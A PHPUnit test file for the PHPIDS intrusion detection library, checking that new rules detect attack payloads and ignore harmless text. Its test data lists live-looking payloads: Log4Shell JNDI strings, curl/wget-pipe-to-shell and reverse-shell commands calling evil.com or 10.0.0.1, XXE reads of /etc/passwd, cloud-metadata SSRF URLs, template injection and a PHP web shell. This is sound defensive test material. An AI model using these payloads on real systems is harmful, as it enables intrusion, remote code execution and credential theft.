<?php
/**
 * PHPIDS
 *
 * Requirements: PHP5, SimpleXML
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * @package PHPIDS tests
 */
namespace IDS\Tests;

use IDS\Filter;
use IDS\Init;
use IDS\Monitor;

/**
 * Rules 79 to 94: attack classes the 2014 rule set did not know, such as
 * template injection, Log4Shell, SSRF, deserialization and NoSQL injection.
 * Rules 95 to 101: signatures of known exploits for PHP and PHP frameworks.
 */
class NewAttackClassesTest extends \PHPUnit\Framework\TestCase
{
    const FIRST_NEW_RULE = 79;
    const LAST_NEW_RULE  = 101;

    /**
     * @var Init
     */
    protected $init;

    protected function setUp(): void
    {
        $this->init = Init::init(IDS_CONFIG);
        $this->init->config['General']['filter_type'] = IDS_FILTER_TYPE;
        $this->init->config['General']['filter_path'] = IDS_FILTER_SET;
        $this->init->config['General']['tmp_path'] = IDS_TEMP_DIR;
        $this->init->config['Caching']['path'] = IDS_FILTER_CACHE_FILE;
    }

    /**
     * @return integer[] ids of the filters that matched the value
     */
    private function scan($value)
    {
        $report = (new Monitor($this->init))->run(array('POST' => array('q' => $value)));
        $event  = $report->getEvent('POST.q');
        if (!$event) {
            return array();
        }

        return array_map(
            function (Filter $filter) {
                return $filter->getId();
            },
            $event->getFilters()
        );
    }

    public static function getAttacks()
    {
        $attacks = array(
            // server-side template injection, probes
            79 => array(
                '{{7*7}}',
                '${7*7}',
                '#{7*7}',
                '<%= 7*7 %>',
                '{{ 7 * 7 }}',
                "{{7*'7'}}",
            ),
            // server-side template and expression language injection
            80 => array(
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                '{{config.items()}}',
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{% import os %}{{ os.popen('id').read() }}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '%{(#_memberAccess["allowStaticMethodAccess"]=true)}',
                "{{constructor.constructor('return process')()}}",
                '{php}echo `id`;{/php}',
            ),
            // JNDI lookups (Log4Shell) and their obfuscation
            81 => array(
                '${jndi:ldap://evil.com/a}',
                '${jndi:rmi://evil.com:1099/x}',
                '${jndi:dns://evil.com}',
                '${${lower:j}ndi:ldap://evil.com/a}',
                '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}',
                '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}',
            ),
            // other Log4j and Commons Text lookups
            82 => array(
                '${env:AWS_SECRET_ACCESS_KEY}',
                '${sys:java.version}',
                '${script:javascript:java.lang.Runtime.getRuntime().exec("id")}',
            ),
            // SSRF, cloud metadata services
            83 => array(
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://100.100.100.200/latest/meta-data/',
                'http://169.254.170.2/v2/credentials',
            ),
            // SSRF, internal addresses and schemes
            84 => array(
                'http://127.0.0.1:8080/admin',
                'http://localhost/server-status',
                'gopher://127.0.0.1:6379/_FLUSHALL',
                'http://[::1]:80/',
                'http://0.0.0.0:22',
                'dict://localhost:11211/stats',
                'http://192.168.1.1/',
                'http://10.0.0.5:9200/_cat/indices',
                'http://2130706433/',
                'http://0x7f000001/',
                'http://user@127.0.0.1/',
            ),
            // PHP stream wrappers
            85 => array(
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                'phar:///var/www/uploads/avatar.jpg/test.txt',
                'expect://id',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
                'zip://uploads/a.zip%23shell.php',
                'compress.zlib://file.gz',
            ),
            // serialized objects
            86 => array(
                'O:8:"stdClass":1:{s:1:"a";s:1:"b";}',
                'a:1:{i:0;O:4:"Evil":0:{}}',
                'C:11:"ArrayObject":37:{x:i:0;a:0:{};m:a:0:{}}',
                'O:+8:"stdClass":0:{}',
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg==',
                'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQ=',
            ),
            // NoSQL operator injection
            87 => array(
                '{"username":{"$ne":null},"password":{"$ne":null}}',
                '{"$where":"this.password.length>0"}',
                '{"user":{"$gt":""}}',
                '{"name":{"$regex":"^adm"}}',
                '{"$or":[{},{"a":"a"}]}',
                'password[$ne]=12',
            ),
            // XML external entities
            88 => array(
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/x.dtd"> %xxe;]>',
                '<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">',
                '<!DOCTYPE test SYSTEM "http://evil.com/evil.dtd">',
                '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>',
            ),
            // prototype pollution
            89 => array(
                '{"__proto__":{"isAdmin":true}}',
                '__proto__[admin]=1',
                '{"constructor":{"prototype":{"isAdmin":true}}}',
                'constructor.prototype.isAdmin=true',
                'constructor[prototype][isAdmin]=true',
            ),
            // operating system command injection
            90 => array(
                '$(whoami)',
                ';wget http://evil.com/s.sh -O /tmp/s.sh',
                '| nc -e /bin/sh 10.0.0.1 4444',
                '&& curl http://evil.com/x | sh',
                'a;cat${IFS}/etc/passwd',
                '|| whoami',
                'x; sleep 10',
                '$(curl evil.com/x.sh|bash)',
                '& ping -c 10 127.0.0.1 &',
                "';nslookup x.evil.com;'",
                ';bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
                '| powershell -enc aQBlAHgA',
                '1;cat /e*c/p*d',
            ),
            // commands in backticks
            91 => array(
                '`id`',
                'test`sleep 5`',
                'aaaa { $ {`wget hxxp://example.com/x.php`}}',
            ),
            // header injection and response splitting
            92 => array(
                "foo\r\nSet-Cookie: admin=1",
                "x\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>",
                'foo%0d%0aSet-Cookie:%20admin=1',
                "a\r\nTransfer-Encoding: chunked",
            ),
            // LDAP filter injection
            93 => array(
                '*)(uid=*))(|(uid=*',
                'admin)(&)',
                '*)(|(objectClass=*))',
                'admin)(|(password=*))',
                '*)(&(objectClass=user)(cn=*',
                '(|(cn=*)(userPassword=*))',
            ),
            // encoded traversal and sensitive files
            94 => array(
                '..%2f..%2f..%2fetc%2fpasswd',
                '..%252f..%252fetc%252fpasswd',
                '..;/..;/admin',
                '/proc/self/environ',
                '/etc/shadow',
                '../../.env',
                '/home/deploy/.ssh/id_rsa',
            ),
            // PHP-CGI argument injection (CVE-2012-1823, CVE-2024-4577)
            95 => array(
                '-d allow_url_include=1 -d auto_prepend_file=php://input',
                "\xADd allow_url_include=1 \xADd auto_prepend_file=php://input",
                '%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
                '-d+allow_url_include%3don+-d+safe_mode%3doff+-d+disable_functions%3d%22%22+-d+cgi.force_redirect%3d0',
            ),
            // PHP filter chains and iconv abuse (CVE-2024-2961)
            96 => array(
                'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp',
                'php://filter/read=zlib.inflate|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:text/plain;base64,e',
            ),
            // deserialization gadget classes (Livewire CVE-2025-54068 and others)
            97 => array(
                'GuzzleHttp\\Psr7\\FnStream',
                '{"s":"clctn","class":"GuzzleHttp\\\\Psr7\\\\FnStream"}',
                'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"',
                'Illuminate\\Foundation\\Testing\\PendingCommand',
                'Monolog\\Handler\\SyslogUdpHandler',
                'Laravel\\SerializableClosure\\SerializableClosure',
                'O:31:"Swift_ByteStream_FileByteStream":0:{}',
                'yii\\rbac\\PhpManager',
                'GuzzleHttp\\Cookie\\FileCookieJar',
            ),
            // framework and tool exploits
            98 => array(
                '/index/\\think\\app/invokefunction',
                '\\think\\Container/invokefunction',
                '../../../../usr/local/lib/php/pearcmd',
                '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
                '/_ignition/execute-solution',
                '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id',
            ),
            // command line options through the query string
            99 => array(
                '--env=local',
                '+--env=dev',
                '--no-debug',
            ),
            // PHP functions that run commands
            100 => array(
                'system("id");',
                "passthru('cat /etc/passwd')",
                "<?php system(\$_GET['c']); ?>",
                'shell_exec($cmd)',
            ),
            // Silverstripe template tags (CVE-2026-54721, CVE-2026-54718)
            101 => array(
                '<% include Evil %>',
                '<% loop $Members %>$Email<% end_loop %>',
                '<% if $CurrentMember %>x<% end_if %>',
                '<% require javascript("x.js") %>',
                '<% with $SiteConfig %>$Title<% end_with %>',
            ),
        );

        $data = array();
        foreach ($attacks as $ruleId => $payloads) {
            foreach ($payloads as $index => $payload) {
                $data["rule $ruleId #$index"] = array($ruleId, $payload);
            }
        }

        return $data;
    }

    /**
     * @dataProvider getAttacks
     */
    public function testAttackIsDetectedByItsRule($ruleId, $payload)
    {
        $this->assertContains($ruleId, $this->scan($payload));
    }

    public static function getHarmlessValues()
    {
        $values = array(
            "Hello, my name is O'Brien & I like bold text.",
            'Please call me at 10:30; cat food is in the cupboard & more is coming.',
            'Tom & Jerry; less is more.',
            'name;id;email',
            'naam;id;datum',
            'Our price is $(USD) 100 or ${price} depending on {{ title }}',
            '{{ user.name }} ordered {{ count }} items for {{ item.price * 2 }}',
            '{% if user %}Hi {{ user }}{% endif %}',
            'https://www.example.com/path?a=1&b=2#top',
            'http://example.com:8080/index.php?id=10',
            'Visit https://10downingstreet.gov.uk/ or https://172.example.com/ or ftp://ftp.example.com/pub/file.txt',
            'I ran ping and it worked; ping me tomorrow.',
            'We use Laravel; PHP 8.2 is required & Python 3 too.',
            'I woke up late; sleep 8 hours is ideal.',
            '<p>Lorem ipsum <a href="https://example.com/a/b">link</a></p>',
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" '
                . '"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',
            '<!DOCTYPE html><html><head><title>x</title></head></html>',
            '<?xml version="1.0" encoding="UTF-8"?><note><to>Jan</to></note>',
            '{"name":"Jan","age":31,"tags":["a","b"],"price":"$10"}',
            '{"filter":{"status":"open"},"sort":"-date","in":[1,2]}',
            "Dear team,\nLocation: Amsterdam\nDate: 12 November\nSubject: meeting\nHost: Jan",
            "Content of the page:\r\n1. intro\r\n2. details",
            'a:1 b:2 c:3',
            'Score 3:2 (o:1), C: 3 points',
            'The ratio is 7*7 = 49 and {3-5} people (1+1)',
            'cn=John Smith,ou=People,dc=example,dc=com',
            '(optional) (see below) | (or not) & (maybe)',
            'f(x) = (a*b)(c=d)',
            'file.zip, photo.jpg and data: see attachment',
            'php: the right way; phar files are archives; zip it',
            'My constructor is great; the prototype looks good.',
            'Rock & roll | less talk, more action',
            'env: production, sys: linux, java: 21',
            'Wi-Fi 192.168.1.1 is the router and the server is at 127.0.0.1 port 80',
            '100% & more; 50% off',
            'email@example.com; other@example.org',
            'C:\\Users\\jan\\Documents\\file.txt',
            'The $where clause and the $in operator are documented at db.example.com',
            'Use `npm install` and `composer update` to set up',
            "# Heading\n- item 1\n- item 2",
            'Set-Cookie is an HTTP header, and so is Content-Type: text/html',
            '../images/logo.png and /etc/hosts and /proc/cpuinfo',
            'I work at .env Solutions; see config/app.php',
            'jar of honey; dict of words; gopher wood',
            'Bedrag: € 1.250,00 (incl. 21% btw); betaling binnen 14 dagen',
            "Beste Jan,\n\nKun je morgen om 10:00 bellen? Groet & tot dan!\nPiet",
            'SELECT your plan: basic | pro | enterprise',
            'a=1&b=2&cat=5&type=7&id=9',
            'The system (legacy) works and the new system ("v2") is faster',
            'We log with Monolog\\Handler\\StreamHandler and Illuminate\\Support\\Collection',
            'I think app/invoke is fine; think about it',
            'convert.iconv is a PHP stream filter; iso-2022-jp is an encoding',
            'Set auto_prepend_file in php.ini if you need it',
            'Run it with -d or -v for more detail',
            'Our environment -- env for short -- is stable',
            'Email: <jan@example.com> wrote: 50% <= x <= 80%',
        );

        $data = array();
        foreach ($values as $index => $value) {
            $data["harmless #$index"] = array($value);
        }

        return $data;
    }

    /**
     * The older rules do react to some of these values; this only guards the
     * new ones.
     *
     * @dataProvider getHarmlessValues
     */
    public function testHarmlessValueDoesNotTriggerANewRule($value)
    {
        $new = array_filter(
            $this->scan($value),
            function ($id) {
                return $id >= self::FIRST_NEW_RULE && $id <= self::LAST_NEW_RULE;
            }
        );

        $this->assertSame(array(), array_values($new));
    }

    public function testNewRulesAreAlsoMatchedAgainstTheUnconvertedValue()
    {
        $monitor = new Monitor($this->init);
        $storage = new \ReflectionProperty($monitor, 'storage');
        $storage->setAccessible(true);

        $raw = array();
        foreach ($storage->getValue($monitor)->getFilterSet() as $filter) {
            if ($filter->isRaw()) {
                $raw[] = $filter->getId();
            }
        }

        $this->assertSame(range(self::FIRST_NEW_RULE, self::LAST_NEW_RULE), $raw);
    }

    /**
     * The converters turn 169.254.169.254 into " 1 1 1254", so this address
     * is only found in the value as it was sent.
     */
    public function testRawFlagMakesARuleSeeTheUnconvertedValue()
    {
        $withFlag    = new Filter(1, '169\.254\.169\.254', 'metadata address', array('ssrf'), 1, true);
        $withoutFlag = new Filter(2, '169\.254\.169\.254', 'metadata address', array('ssrf'), 1);

        $this->assertTrue($withFlag->isRaw());
        $this->assertFalse($withoutFlag->isRaw());

        $monitor = new Monitor($this->init);
        $storage = new \ReflectionProperty($monitor, 'storage');
        $storage->setAccessible(true);
        $storage->getValue($monitor)->addFilter($withFlag)->addFilter($withoutFlag);

        $ids = array();
        foreach ($monitor->run(array('q' => 'http://169.254.169.254/'))->getEvent('q')->getFilters() as $filter) {
            $ids[] = $filter->getId();
        }

        $this->assertContains(1, $ids);
        $this->assertNotContains(2, $ids);
    }

    /**
     * Several exploits put their payload in the name of a parameter. Those
     * are only seen when scan_keys is switched on.
     */
    public function testPayloadInAParameterNameIsDetectedWhenKeysAreScanned()
    {
        $keys = array(
            95 => "\xADd allow_url_include=1 \xADd auto_prepend_file=php://input",
            99 => '--env',
            89 => '__proto__[admin]',
            87 => 'password[$ne]',
        );

        foreach ($keys as $ruleId => $key) {
            $withoutKeys = new Monitor($this->init);
            $this->assertTrue($withoutKeys->run(array('GET' => array($key => '1')))->isEmpty());

            $withKeys = new Monitor($this->init);
            $withKeys->scanKeys = true;

            $ids = array();
            foreach ($withKeys->run(array('GET' => array($key => '1'))) as $event) {
                foreach ($event->getFilters() as $filter) {
                    $ids[] = $filter->getId();
                }
            }

            $this->assertContains($ruleId, $ids, 'key ' . json_encode($key, JSON_INVALID_UTF8_SUBSTITUTE));
        }
    }

    /**
     * A value made only of letters, digits and slashes used to skip the
     * rules altogether, which let plain system paths through.
     */
    public function testPlainSystemPathIsScanned()
    {
        $this->assertNotEmpty($this->scan('/etc/passwd'));
        $this->assertNotEmpty($this->scan('/proc/self/environ'));
    }
}
